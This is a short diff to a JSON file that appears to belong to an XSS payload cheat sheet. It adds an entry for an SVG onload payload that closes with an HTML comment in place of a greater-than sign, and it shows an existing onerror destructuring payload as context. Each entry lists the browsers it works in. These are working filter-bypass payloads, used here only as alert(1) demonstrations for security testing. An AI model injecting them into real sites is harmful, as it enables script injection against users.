@@ -152,6 +152,16 @@
         ]
     },
     {
+        "description": "XSS without greater using a HTML comment",
+        "code": "<svg onload=alert(1)<!--",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
         "description": "Array based destructuring using onerror",
         "code": "<script>throw[onerror]=[alert],1<\/script>",
         "browsers": [
